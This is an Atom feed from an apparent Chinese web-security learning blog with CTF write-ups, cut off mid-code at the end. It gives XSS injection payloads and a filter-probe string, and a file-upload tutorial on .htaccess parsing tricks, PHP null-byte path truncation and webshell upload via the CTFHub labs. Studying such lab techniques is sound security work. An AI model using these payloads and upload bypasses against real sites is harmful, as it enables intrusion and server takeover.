<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WELLS Blog</title>
  
  <subtitle>Learning Web Security....</subtitle>
  <link href="https://we11s.github.io/atom.xml" rel="self"/>
  
  <link href="https://we11s.github.io/"/>
  <updated>2024-03-05T14:22:23.112Z</updated>
  <id>https://we11s.github.io/</id>
  
  <author>
    <name>Wells</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XSS-Lab题解</title>
    <link href="https://we11s.github.io/posts/1041826382/"/>
    <id>https://we11s.github.io/posts/1041826382/</id>
    <published>2024-03-05T11:38:03.000Z</published>
    <updated>2024-03-05T14:22:23.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS-LAB题解"><a href="#XSS-LAB题解" class="headerlink" title="XSS-LAB题解"></a>XSS-LAB题解</h1><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>观察playroad与页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level1.php?name=test</span><br></pre></td></tr></table></figure><p>页面内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">欢迎来到level1</span><br><span class="line">欢迎用户test</span><br></pre></td></tr></table></figure><p>尝试在<code>name=</code>后插入xss语句<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level1.php?name=&lt;script&gt;alert(&#x27;heiheihei&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>成功触发XSS，进入下一关</p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>中间存在个搜索框，尝试直接写入语句<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，查看服务端处理后的页面源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(&#x27;heiheihei&#x27;)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&lt;script&gt;alert(&#x27;heiheihei&#x27;)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br></pre></td></tr></table></figure><p>发现正文部分的回显都被html实体编码处理，但在搜索栏处存在着<code>value=&quot;&lt;script&gt;alert(&#39;heiheihei&#39;)&lt;/script&gt;&quot;</code>，因此可以进行构造闭合语句，<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，返回后的页面代码在拼接处理后为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>成功触发XSS，进入下一关</p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>通用的中间存在个搜索框，使用探测语句进行查看可以进行哪些操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt; &#x27; &amp;quot; () Onerror onerror javascript: JavaScript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt;  &amp;lt;img&amp;gt;  &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / 相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&#x27;&amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt; &#x27; &amp;quot; () Onerror onerror javascript: JavaScript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt;  &amp;lt;img&amp;gt;  &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / &#x27;&gt;</span><br></pre></td></tr></table></figure><p>发现<code>&lt; &gt; &quot;</code>都被过滤了，但<code>&#39;</code>与<code>onerror</code>等标签属性并没有被过滤，因此可以使用<code>&#39;</code>造闭合使用，使用语句<code>&#39; onmouseover=alert(1) &#39;</code>，进行对前面<code>value</code>的闭合和添加属性，<code>onmouseover</code></p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>level8<br>level9<br>level10<br>level11<br>level12<br>level13<br>level14<br>level15<br>level16<br>level17<br>level18<br>level19<br>level20<br>level21<br>level22<br>level23<br>level24<br>level25<br>level26<br>level27<br>level28<br>level29<br>level30<br>level31<br>level32<br>level33<br>level34<br>level35<br>level36<br>level37<br>level38<br>level39<br>level40</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XSS-LAB题解&quot;&gt;&lt;a href=&quot;#XSS-LAB题解&quot; class=&quot;headerlink&quot; title=&quot;XSS-LAB题解&quot;&gt;&lt;/a&gt;XSS-LAB题解&lt;/h1&gt;&lt;h3 id=&quot;level1&quot;&gt;&lt;a href=&quot;#level1&quot; class=&quot;head</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-XSS" scheme="https://we11s.github.io/tags/Web-XSS/"/>
    
  </entry>
  
  <entry>
    <title>XSS绕过篇</title>
    <link href="https://we11s.github.io/posts/1946610579/"/>
    <id>https://we11s.github.io/posts/1946610579/</id>
    <published>2024-03-05T11:35:40.000Z</published>
    <updated>2024-03-05T14:22:23.111Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS绕过总结"><a href="#XSS绕过总结" class="headerlink" title="XSS绕过总结"></a>XSS绕过总结</h1><h3 id="用于探测的万能语句："><a href="#用于探测的万能语句：" class="headerlink" title="用于探测的万能语句："></a>用于探测的万能语句：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; &lt;/script&gt; &lt;Script&gt; &lt;/Script&gt; &lt;scrscriptipt&gt; &lt;SCRscriptIPT&gt; &#x27; &quot; () Onerror onerror javascript: JavaScript: &lt;!-- --&gt; eval() &lt;a&gt;  &lt;img&gt;  &lt;iframe&gt; &lt;form&gt; src &#123;&#125; / +</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XSS绕过总结&quot;&gt;&lt;a href=&quot;#XSS绕过总结&quot; class=&quot;headerlink&quot; title=&quot;XSS绕过总结&quot;&gt;&lt;/a&gt;XSS绕过总结&lt;/h1&gt;&lt;h3 id=&quot;用于探测的万能语句：&quot;&gt;&lt;a href=&quot;#用于探测的万能语句：&quot; class=&quot;head</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-XSS" scheme="https://we11s.github.io/tags/Web-XSS/"/>
    
  </entry>
  
  <entry>
    <title>SSTI漏洞-基础篇</title>
    <link href="https://we11s.github.io/posts/416548136/"/>
    <id>https://we11s.github.io/posts/416548136/</id>
    <published>2024-03-05T11:26:19.000Z</published>
    <updated>2024-03-05T14:22:23.110Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="https://we11s.github.io/posts/154257042/"/>
    <id>https://we11s.github.io/posts/154257042/</id>
    <published>2024-03-01T12:33:11.000Z</published>
    <updated>2024-03-11T12:57:16.334Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h3><p>文件上传漏洞是指由于对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以<strong>向服务器上传恶意文件并进行执行</strong>，后获得<strong>执行服务端命令的能力</strong>。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。</p><h3 id="产生文件上传漏洞的原因"><a href="#产生文件上传漏洞的原因" class="headerlink" title="产生文件上传漏洞的原因"></a>产生文件上传漏洞的原因</h3><ul><li><strong>不充分的文件验证</strong>：如果应用程序未能正确验证上传文件的类型（如MIME类型或文件扩展名）和内容，攻击者可能会上传执行恶意代码的文件。</li><li><strong>不安全的文件存储</strong>：如果上传的文件存储在可通过Web直接访问的位置，且文件名可预测或未经过适当处理，攻击者可能会执行上传的恶意文件。</li><li><strong>未对权限进行限制</strong>：权限上没有对于上传的文件目录设置不可执行权限。</li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><strong>CTFHUB-技能树-WEB-文件上传-无验证</strong></p><p>因为在上传文件后无验证文件信息以及设置动态脚本不可被执行，因此便可直接上传远程木马文件，</p><details class="folding-tag" ><summary> 查看图片 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240305194710871.png" alt="image-20240305194710871"></p>              </div>            </details><p>上传后访问此网站路径下的<code>/upload/shell.php</code>发现是空白界面，说明<strong>php文件可以被执行</strong>，此时通过冰蝎进行远程连接</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240305194939723.png" alt="image-20240305194939723"></p>              </div>            </details><p>出现phpinfo页面，说明连接成功，即可获得主机部分权限，转到对应目录读取<code>flag</code></p><details class="folding-tag" ><summary> 查看图片 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240305195139075.png" alt="image-20240305195139075"></p>              </div>            </details><h1 id="后端绕过-解析漏洞"><a href="#后端绕过-解析漏洞" class="headerlink" title="后端绕过-解析漏洞"></a>后端绕过-解析漏洞</h1><blockquote><p>解析漏洞通常指的是当应用程序或服务器在处理上传文件时，由于对文件类型的解析不当或不安全，导致攻击者能够上传恶意文件，从而执行不当操作或获取不当权限的安全问题。例如允许用户上传<code>.htaccess</code>文件导致用户可以设置任意文件格式的解析方式</p></blockquote><h2 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a><code>.htaccess</code>绕过</h2><h3 id="htaccess简介"><a href="#htaccess简介" class="headerlink" title=".htaccess简介"></a><code>.htaccess</code>简介</h3><p><code>.htaccess</code>是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。通过<code>.htaccess</code>可以做到：重写<strong>解析规则</strong>(如：将<code>png</code>文件作为<code>php</code>来进行解析等)、URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。</p><h3 id="htaccess的作用范围"><a href="#htaccess的作用范围" class="headerlink" title=".htaccess的作用范围"></a><code>.htaccess</code>的作用范围</h3><p><code>.htaccess</code>的生效范围为.htaccess文件所在的当前目录。</p><h3 id="htaccess利用前提"><a href="#htaccess利用前提" class="headerlink" title=".htaccess利用前提"></a><code>.htaccess</code>利用前提</h3><p> web具体应用没有禁止<code>.htaccess</code>文件的上传，同时web服务器提供商允许用户上传自定义的<code>.htaccess文件</code>。</p><h3 id="htaccess使用模板"><a href="#htaccess使用模板" class="headerlink" title=".htaccess使用模板"></a><code>.htaccess</code>使用模板</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#对于php</span><br><span class="line">AddType application/x-httpd-php .html  #将html文件作为php文件进行解析</span><br><span class="line">#对于python</span><br><span class="line">AddHandler cgi-script .py #将html文件作为php文件进行解析</span><br><span class="line">Options +ExecCGI  </span><br><span class="line">#对于Perl</span><br><span class="line">AddHandler cgi-script .cgi .pl</span><br><span class="line">Options +ExecCGI</span><br></pre></td></tr></table></figure><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p><strong>CTFHUB-技能树-WEB-文件上传-.htaccess</strong></p><p>查看页面源码可以发现页面后端源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;CTFHub 文件上传 - htaccess&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;CTFHub 文件上传 - htaccess&lt;/h1&gt;</span><br><span class="line">    &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;br /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">if (!empty($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">    $ext = pathinfo($name)[&#x27;extension&#x27;];</span><br><span class="line">    $blacklist = array(&quot;php&quot;, &quot;php7&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;);</span><br><span class="line">    if (!in_array($ext, $blacklist)) &#123;</span><br><span class="line">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], UPLOAD_PATH . $name)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">            echo &quot;上传文件相对路径&lt;br&gt;&quot; . UPLOAD_URL_PATH . $name;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;文件类型不匹配&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>在 <code>$blacklist = array(&quot;php&quot;, &quot;php7&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;);</code>发现大多数的动态执行脚本文件后缀被禁止，但发现<code>.htaccess</code>并没有被禁止，此时可以上传文件<code>.htaccess</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .txt</span><br></pre></td></tr></table></figure><p>再上传含有shell的php代码的<code>txt</code>文件，上传成功后，访问<code>upload/shell.php.txt</code>，无内容显示，说明<code>.txt</code>文件被作为php脚本执行成功，使用冰蝎连接</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240305203044058.png"></p>              </div>            </details><p>成功获取<code>phpinfo</code>页面，连接成功，读取flag</p><h1 id="后端绕过-软件漏洞"><a href="#后端绕过-软件漏洞" class="headerlink" title="后端绕过-软件漏洞"></a>后端绕过-软件漏洞</h1><blockquote><p>利用PHP某些版本的BUG可以做到一些意想不到的效果。例如，<code>00</code>截断</p></blockquote><h2 id="PHP-00截断绕过"><a href="#PHP-00截断绕过" class="headerlink" title="PHP 00截断绕过"></a>PHP <code>00</code>截断绕过</h2><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://gudiffany.github.io/">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="">          <i class="anzhiyufont anzhiyu-icon-link" style=""></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">Diffany</div>            <div class="tag-link-sitename"> 感谢Diffany师傅提供的指导</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><h3 id="00截断利用条件"><a href="#00截断利用条件" class="headerlink" title="00截断利用条件"></a><code>00</code>截断利用条件</h3><ul><li>php版本要小于5.3.4，5.3.4及以上已经修复该问题</li><li>PHP的magic_quotes_gpc为OFF状态</li><li>用户可指定上传路径</li></ul><h3 id="00绕过简介"><a href="#00绕过简介" class="headerlink" title="00绕过简介"></a><code>00</code>绕过简介</h3><p>ASCII中0作为特殊字符保留，表示字符串结束。</p><p>当用户传递文件<strong>上传路径包含</strong><code>00</code>，无论<code>00</code>后存在任何内容文本(或后端直接对<code>00</code>字符串进行拼接其他字符串)，<code>00</code>后的内容都会被截断，最后字符串留下<code>00</code>前的内容且<strong>不包括</strong><code>00</code>。</p><p><strong>以GET方式举例：</strong></p><p>ASCII中的<code>00</code>，无法直接显示，所以使用URL编码，ASCII中<code>00</code>经过url编码后变为<code>%00</code></p><p>页面源码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>test.txt</code>的内容为</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &#x27;SUCCESS&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>test.txt%00.2.txt</code>的内容为</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &#x27;False&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>实验1</strong></p><p>此时通过GET传递参数，<code>?file=test.txt%00.2.txt</code></p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240310203142775.png" alt="image-20240310203142775"></p>              </div>            </details><p>页面出现SUCCESS，说明<code>include</code>的文件是<code>test.txt</code>，此时<code>file</code>被解析为<code>test.txt</code></p><p><strong>实验2：改变页面源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&#x27;.2.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时通过GET传递参数，<code>?file=test.txt%00</code></p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240310203219223.png" alt="image-20240310203219223"></p>              </div>            </details><p>页面还是出现SUCCESS，说明<code>include</code>的文件是<code>test.txt</code>，而不是<code>test.txt.2.txt</code>，此时变量<code>file</code>受<code>$_GET[&#39;file&#39;]</code>中的影响，一同被截断</p><h3 id="00绕过方法"><a href="#00绕过方法" class="headerlink" title="00绕过方法"></a><code>00</code>绕过方法</h3><h4 id="GET传参保存路径"><a href="#GET传参保存路径" class="headerlink" title="GET传参保存路径"></a>GET传参保存路径</h4><p>后端对文件路径的处理类似为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$des</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/对文件名的处理操作......&quot;</span> . <span class="variable">$ext</span>;</span><br></pre></td></tr></table></figure><p>此时<code>road</code>为我们可控的参数，可直接进行使用<code>%00</code>截断</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/915b5ae1a067f5ffc307790bc7a964df.png" alt="915b5ae1a067f5ffc307790bc7a964df"></p>              </div>            </details><p>由于使用<code>00</code>截断，所以最后文件保存在<code>/var/www/html/upload</code>,名为<code>shell.php</code>,根据位置，访问<code>/upload/shell.php</code>,即进入我们所在的页面，使用蚁剑连上后，可以找到我们成功截断的<code>shell.php</code></p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/bf5ed62c6866f2d35525c1d4a5505f9b.png" alt="bf5ed62c6866f2d35525c1d4a5505f9b"></p>              </div>            </details><h4 id="POST传参保存路径"><a href="#POST传参保存路径" class="headerlink" title="POST传参保存路径"></a>POST传参保存路径</h4><p>与GET传参类似的的是：后端对文件路径的处理类似为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$des</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/对文件名的处理操作......&quot;</span> . <span class="variable">$ext</span>;</span><br></pre></td></tr></table></figure><p>此时<code>road</code>为我们可控的参数，但与GET传参不同的是，<strong>http请求内包含文件时，POST参数不再被自动解码</strong>，所以POST传参需要使用BP使用查看16进制的请求详情，修改一个十六进制的为<code>00</code></p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/2688a4e300bf53dea64eb094b8d2ae55.png" alt="2688a4e300bf53dea64eb094b8d2ae55"></p>              </div>            </details><p>步骤一：修改路径添加文件名，写入需要执行的代码语句</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/6e15d3a27f66fc4152400ddbecb2dbfb.png" alt="6e15d3a27f66fc4152400ddbecb2dbfb"></p>              </div>            </details><p>步骤一：切换为十六进制模式，修改所需要替换为<code>00</code>的位置</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/2671bae349c3b99667fdab4ac7d326ea.png" alt="2671bae349c3b99667fdab4ac7d326ea"></p>              </div>            </details><p>由于使用<code>00</code>截断，所以最后文件保存在<code>/var/www/html/upload</code>,名为<code>test.php</code>,根据位置，访问<code>/upload/test.php</code>,即进入我们所在的页面，可以看到PHP的配置信息，<code>00</code>截断成功</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240311000048915.png" alt="image-20240311000048915"></p>              </div>            </details><h3 id="例题：-1"><a href="#例题：-1" class="headerlink" title="例题："></a>例题：</h3><p><strong>CTFHUB-技能树-WEB-文件上传-00截断</strong></p><p>查看页面源代码发现后端的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="variable">$info</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="variable">$des</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>) . <span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>) . <span class="string">&quot;.&quot;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$des</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件类型不匹配&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>抓包，修改GET参数为<code>?road=/var/www/html/upload/shell.php%00</code>，使用<code>00</code>截断，在传入文件的内容替换成需要执行的代码，如一句话等</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/f78ac8eccde754e43869718de37e0d80.png" alt="f78ac8eccde754e43869718de37e0d80"></p>              </div>            </details><p>然后使用蚁剑连接进入，可以看到我们是成功使用<code>00</code>截断写入的shell.php</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240310194757813.png" alt="image-20240310194757813"></p>              </div>            </details><h1 id="后端检测-修改绕过"><a href="#后端检测-修改绕过" class="headerlink" title="后端检测-修改绕过"></a>后端检测-修改绕过</h1><blockquote><p>通过抓包我们发送的请求，修改请求包中的部分内容，如修改文件名(黑名单双写，大小写替换)，MIME，添加文件头等等操作，使之上传的木马符合后端的要求，使之成功上传。</p></blockquote><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><h3 id="双写绕过原理"><a href="#双写绕过原理" class="headerlink" title="双写绕过原理"></a>双写绕过原理</h3><p>有时候在检测时，后台会把敏感字符删除，这个时候，可以使用双写进行绕过。比如：将<code>.php</code>改写为<code>.pphphp</code></p><p>后端的代码类似为：</p><figure class="highlight php"><table><tr><td 